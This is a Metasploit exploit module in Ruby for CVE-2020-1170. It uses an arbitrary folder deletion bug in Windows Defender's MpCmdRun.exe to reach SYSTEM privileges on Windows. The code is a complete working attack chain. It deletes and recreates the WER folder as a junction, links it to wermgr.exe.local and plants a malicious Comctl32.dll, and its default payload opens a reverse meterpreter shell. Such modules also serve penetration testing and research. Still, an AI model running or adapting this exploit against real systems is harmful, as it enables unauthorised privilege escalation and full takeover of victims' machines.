##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::EXE # Needed for generate_payload_dll
  include Msf::Post::Windows::FileSystem # Needed for create_symlink
  include Msf::Post::Windows::FileInfo # Needed for file_version
  include Msf::Exploit::FileDropper # Needed for register_file_for_cleanup
  include Msf::Post::File # Needed for upload_file
  prepend Msf::Exploit::Remote::AutoCheck # Included so that the exploit will automatically check if the target is vulnerable before attempting to exploit it.

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'Windows Defender MpCmdRun.log Arbitrary Folder Deletion Local Privilege Escalation',
          'Description' => %q{
            This module exploits CVE-2020-1170, an arbitrary folder deletion vulnerability in Windows Defender's
            MpCmdRun.exe binary on MpCmdRun.exe versions prior to 4.18.2005.1 to delete the folder at C:\ProgramData\Microsoft\Windows\WER.
            An attacker can then abuse the lack of the C:\ProgramData\Microsoft\Windows\WER folder to recreate the C:\ProgramData\Microsoft\Windows\WER
            folder as a junction directory which points to a directory of their choosing, and then create a WER error report. This will result in
            WER creating the target directory with permissions that allow all users to create files and folders inside it. Attacker can abuse
            this to make WER create the C:\Windows\System32\wermgr.exe.local folder with open permissions and plant a malicious DLL inside it, which
            when loaded by the wermgr.exe process as SYSTEM, will result in a LPE vulnerability and will grant the attacker SYSTEM level code execution.

            Note that this module will not work if another AV is installed on the target as this will disable Windows Defender. Additionally, the attacker
            will only be able to trigger this module once per target unless they delete both the C:\ProgramData\Microsoft\Windows\WER folder
            and the C:\Windows\Temp\MpCmdRun.log.bak file.
          },
          'License' => MSF_LICENSE,
          'Author' =>
              [
                'itm4n', # Original bug finder
                'gwillcox-r7', # msf module
                'jonaslyk' # Directory deletion to SYSTEM shell technique and assistance with questions.
              ],
          'Platform' => ['win'],
          'SessionTypes' => ['meterpreter'],
          'Privileged' => true,
          'Arch' => [ARCH_X86, ARCH_X64],
          'Targets' =>
              [
                [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],
              ],
          'DefaultTarget' => 0,
          'DisclosureDate' => '2020-06-09',
          'References' =>
              [
                ['CVE', '2020-1170'],
                ['URL', 'https://itm4n.github.io/cve-2020-1170-windows-defender-eop/'],
                ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html'],
                ['URL', 'https://secret.club/2020/04/23/directory-deletion-shell.html'],
              ],
          'Notes' =>
              {
                'SideEffects' => [ CONFIG_CHANGES ],
                'Reliability' => [ UNRELIABLE_SESSION ],
                'Stability' => [ CRASH_SAFE ]
              },
          'DefaultOptions' =>
              {
                'EXITFUNC' => 'thread',
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'WfsDelay' => 900
              }
        )
    )
    register_options(
      [
        OptString.new('WritableDir', [ true, 'The location of a directory the current user can write to', 'C:\\Windows\\Temp\\' ]),
        OptInt.new('WaitTime', [ true, 'Number of seconds to wait for background file writes to complete before clearing the WER directory', 30 ]),
      ]
    )
  end

  def create_wer_job
    opts = {}
    opts[:session_id] = rand_text_numeric(8)
    opts[:code] = %{
        #
        # Calls to WER based on the Add-Type Win32 API calling method described at
        # https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1/
        #
        # Type definitions taken in part from MSDN documentation as well as from
        # http://www.pinvoke.net/default.aspx/wer.WerReportSubmit and http://www.pinvoke.net/default.aspx/wer.WerReportCreate
        #
        $MethodDefinition = @'
        public enum WER_REPORT_TYPE
            {
            WerReportNonCritical,
            WerReportCritical,
            WerReportApplicationCrash,
            WerReportApplicationHange,
            WerReportKernel,
            WerReportInvalid
            }
        public enum WER_CONSENT
            {
            WerConsentAlwaysPrompt = 4,
            WerConsentApproved = 2,
            WerConsentDenied = 3,
            WerConsentMax = 5,
            WerConsentNotAsked = 1
            }
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportCreate(string pwzEventType, WER_REPORT_TYPE repType, IntPtr pReportInformation, ref IntPtr phReportHandle);
        [DllImport("wer.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public extern static int WerReportSubmit(IntPtr hReportHandle, int consent, int dwFlags, ref IntPtr pSubmitResult);
'@

        Add-Type -MemberDefinition $MethodDefinition -Name 'WER' -Namespace 'Win32Dupe' -PassThru
        $handle = 0 # Need to create the variable for the ref, so lets add this in so long.
        if( ([Win32Dupe.WER]::WerReportCreate("BB",[Win32Dupe.WER+WER_REPORT_TYPE]::WerReportNonCritical, 0, [ref] $handle)) -ne 0 ){ # 0 in third argument is for blank pReportInformation
            Write-Host "[-] Exploit failed. Couldn't create the report" -ForegroundColor Red
        }
        $result = 999 # Need to create the variable for the ref, so set it to a random value of 999.
        [Win32Dupe.WER]::WerReportSubmit($handle, 1, 36, [ref]$result) # 1 = WerConsentNotAsked, 36 = WER_SUBMIT_QUEUE | WER_SUBMIT_OUTOFPROCESS
        Write-Host $result
        Write-Host "[+] WER directory creation via WER report submission was a success!" -ForegroundColor Green
}
    create_wer_job_result = client.powershell.execute_string(opts)
    if create_wer_job_result =~ /success/
        print_good('Successfully created the WER job!')
    elsif create_wer_job_result =~ /fail/
        fail_with(Failure::UnexpectedReply, 'Failed to create the WER job!')
    else
        print(create_wer_job_result.to_s)
        fail_with(Failure::UnexpectedReply, 'Unknown error occurred whilst trying to create the WER job!')
    end
  end

  def move_folders_out_of_wer
    relocation_dir = "#{datastore['WritableDir']}\\#{Rex::Text.rand_text_alpha(6..13)}"
    print_status('Making the temp folder which will house the folders that we move out of the WER directory...')
    mkdir(relocation_dir)
    register_dir_for_cleanup(relocation_dir)

    print_status("cd'ing to relocation directory and relocating the folders...")
    cd(relocation_dir)
    print_status('Moving files out of the WER directory into the relocation directory...')

    # I was going to use rename_file here but it doesn't forcibly move folders when we run it under a Meterpreter session.
    # So yeah this is hacky but it works much more reliably and is the same command that rename_file does for Windows sessions,
    # its just me forcing it to do it for Meterpreter as a workaround. Feel free to fix this up if Meterpreter does eventually
    # get fixed to address this issue.
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive ."')
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue ."')
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp ."')

    print_status('Changing directory back to the writable directory...')
    cd(datastore['WritableDir'])
    print_good('Successfully moved the folders out of C:\\ProgramData\\Microsoft\\Windows\\WER!')
  end

  def check
    unless (client.core.use('powershell'))
        fail_with(Failure::BadConfig, "Can't load Meterpreter Powershell extension!")
    end
    opts = {}
    opts[:session_id] = rand_text_numeric(8)

    sysinfo_value = sysinfo['OS']

    if sysinfo_value !~ /windows/i
      # Non-Windows systems are definitely not affected.
      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')
    end

    # Check if C:\Windows\Temp\MpCmdRun.log.bak exists and if so, if we can delete it. If it exists and we
    # can't delete it, then we can't exploit this vulnerability. Do this via PowerShell as session.fs.file.stat errors out
    # if it doesn't have access to the file and exists?() and file_exist?() and methods using cmd.exe were failing to return
    # good errors if we didn't have access to read the file.
    opts[:code] = 'powershell -C "type \'C:\\Windows\\Temp\\MpCmdRun.log.bak\'"'
    backup_file_exists = client.powershell.execute_string(opts)
    if backup_file_exists =~ /Access is denied/
        print_error("Current user doesn't have access to C:\\Windows\\Temp\\MpCmdRun.log.bak! We cannot exploit this target until this file is deleted!")
        return CheckCode::Safe
    elsif backup_file_exists =~ /SignaturesUpdateService/ # Aka we can read the contents of the file...
        opts[:code] = 'powershell -c \'del "C:\\Windows\\Temp\\MpCmdRun.log.bak"\''
        remove_file_result = client.powershell.execute_string(opts)
        print_status(remove_file_result)
        unless (remove_file_result =~ /Access is denied/)
            print_error('The file C:\\Windows\\Temp\\MpCmdRun.log.bak could be read but could not be deleted. We cannot proceed without deleting this file. Exiting!')
            return CheckCode::Safe
        end
        print_good("C:\\Windows\\Temp\\MpCmdRun.log.bak existed on the target but we successfully removed it!")
    else
      print_good("C:\\Windows\\Temp\\MpCmdRun.log.bak doesn't exist on the target!")
    end

    mprun_file_version = file_version('C:\\Program Files\\Windows Defender\\MpCmdRun.exe')
    mprun_file_version.pop # Remove last element, the branch. We aren't interested in it.
    gem_version_mpfile = Gem::Version.new(mprun_file_version.join('.')) # Taken from https://stackoverflow.com/questions/4018689/ruby-combining-an-array-into-one-string
    print_status("Version #{gem_version_mpfile} of MpCmdRun.exe detected on target!")
    if gem_version_mpfile >= Gem::Version.new('4.18.2005.1')
      return CheckCode::Safe
    end

    opts[:code] = 'powershell -c "Get-MpComputerStatus"'
    mpcomputerstatus_result = client.powershell.execute_string(opts)

    if mpcomputerstatus_result =~ /800106BA/ # Error code 0x800106BA occurs when another security product is installed according
      # to https://answers.microsoft.com/en-us/windows/forum/windows_vista-security/windows-defender-error-0x800106ba/0e2f4e98-4e5f-4991-8994-0f8c80784547
      print_error('The target has an outdated version of MpCmdRun.exe installed but they have another AV installed.')
      return CheckCode::Safe
    end

    print_good('Target appears to have an outdated version of MpCmdRun.exe that is being actively used.')
    return CheckCode::Appears
  end

  def exploit
    ntapipath = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1170', 'NtApiDotNet.dll')
    powershell_file_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1170', 'DefenderArbitraryFileDelete.ps1')
    opts = {}
    opts[:session_id] = rand_text_numeric(8)

    ntapi_target_file_path = datastore['WritableDir'] + '\\' + Rex::Text.rand_text_alpha(6..13) + '.dll'
    powershell_target_file_path = datastore['WritableDir'] + '\\' + Rex::Text.rand_text_alpha(6..13) + '.ps1'

    print_status('Uploading the PowerShell file that will run the main exploit along with the DLL to support its operations...')
    upload_file(ntapi_target_file_path, ntapipath)
    upload_file(powershell_target_file_path, powershell_file_path)
    register_file_for_cleanup(ntapi_target_file_path)
    register_file_for_cleanup(powershell_target_file_path)
    print_good('Uploaded necessary files and registered them for cleanup!')

    opts[:code] = 'powershell -c "type \'C:\\ProgramData\\Microsoft\\Windows\\WER\'"'
    wer_directory_test_results = client.powershell.execute_string(opts)

    # Check if the WER directory already exists. If it does not exist, create it via create_wer_job, and then move the subdirectories
    # and files out of it so it can be turned into a junction directory. Otherwise trigger the bug in Windows Defender so the WER
    # directory is deleted as SYSTEM (since current user won't have permissions to delete it), then follow the same steps.
    if (wer_directory_test_results =~ /does not exist/)
      print_status("C:\\ProgramData\\Microsoft\\Windows\\WER doesn't exist on the target! Recreating it now...")
      create_wer_job
      print_good("Recreated the missing C:\\ProgramData\\Microsoft\\Windows\\WER directory on the target!")
      print_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that it can be turned into a directory junction...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be turned into a junction directory.
    else
      print_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that we can delete the folder...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be successfully deleted.

      # Taken from @itm4n's PoC code and his exploit from https://github.com/itm4n/CVEs/blob/master/CVE-2020-1170/DefenderArbitraryFileDelete.ps1
      command_to_execute = "powershell -ep bypass -c \". #{powershell_target_file_path}; DoMain -TargetFolder 'C:\\ProgramData\\Microsoft\\Windows\\WER' -NtApiDLLPath '#{ntapi_target_file_path}' -BaitFileName '#{Rex::Text.rand_text_alpha(6..13)}.txt'\""
      print_status('Triggering the vulnerability, this usually takes about 40 to 60 minutes to complete...')
      result = cmd_exec(command_to_execute, nil, 3600)
      if result =~ /success/
        print_good('Successfully triggered the arbitrary file deletion vulnerability!')
      elsif result =~ /fail/
        fail_with(Failure::UnexpectedReply, 'Failed to trigger the arbitrary file deletion vulnerability!')
      else
        print(result.to_s)
        fail_with(Failure::UnexpectedReply, 'Unknown error occurred whilst trying to run the PowerShell script!')
      end

      print_status("Sleeping for #{datastore['WaitTime']} seconds to ensure any extra operations on the WER directory go through before we try and clear it up.")
      sleep(datastore['WaitTime'])
      print_status('Moving folders out of C:\\ProgramData\\Microsoft\\Windows\\WER so that it can be turned into a directory junction...')
      move_folders_out_of_wer # Move subdirectories out of C:\ProgramData\Microsoft\Windows\WER\
      # so that it can be turned into a junction directory.
    end

    # Big shout out to @jonaslyk for his recommendations on how to fix this up and for helping us get this logic working!
    print_status('Creating the directory junction...')
    mount_point_handle = create_mount_point("\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER", "\\RPC Control")
    unless (mount_point_handle != nil)
        fail_with(Failure::Unknown, 'Error when creating the directory junction... aborting.')
    end
    print_good('Created the directory junction successfully!')

    symlink_handle = create_symlink(nil, '\\RPC Control\\Temp', '\\??\\c:\\windows\\system32\\wermgr.exe.local')
    unless symlink_handle
      fail_with(Failure::Unknown, 'Error when creating the wermgr.exe.local symlink... aborting.')
    end
    print_good('Created the symbolic link between \\RPC Control\\Temp and \\??\\c:\\windows\\system32\\wermgr.exe.local successfully!')
    symlink_handle_value = symlink_handle['LinkHandle']

    print_status('Starting the WER job to create the C:\\Windows\\System32\\wermgr.exe.local directory...')
    create_wer_job

    print_status('Closing symbolic link handle...')
    session.railgun.kernel32.CloseHandle(symlink_handle_value)
    print_good('Closed symlink handle!')

    print_status('Cleaning up by removing the WER junction directory...')
    session.railgun.kernel32.CloseHandle(mount_point_handle)
    session.fs.dir.rmdir("C:\\ProgramData\\Microsoft\\Windows\\WER")
    print_good('Removed the WER junction directory!')

    mkdir_result = mkdir('C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8')
    unless (mkdir_result == 0)
      fail_with(Failure::UnexpectedReply, "Could not create the AMD directory inside the wermgr.exe.local folder. Exiting as we can't plant the DLL now :/")
    end
    print_good('Successfully created C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8')

    print_status('Uploading malicious DLL as Comctl32.dll to created directory for a DLL planting attack...')
    write_file('C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8\\Comctl32.dll', generate_payload_dll)
    print_good('Successfully uploaded the malicious Comctl32.dll file!')

    register_file_for_cleanup('C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8\\Comctl32.dll')
    register_dir_for_cleanup('C:\\Windows\\System32\\wermgr.exe.local\\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8')
    register_dir_for_cleanup('C:\\Windows\\System32\\wermgr.exe.local')
    register_file_for_cleanup('C:\\Windows\\Temp\\MpCmdRun.log.bak')
    print_status("Sleeping for a few seconds to allow things to calm down...")
    sleep(10)
    print_status('Starting the WER job to gain a shell...')
    create_wer_job

    print_status('All done!')
  end
end
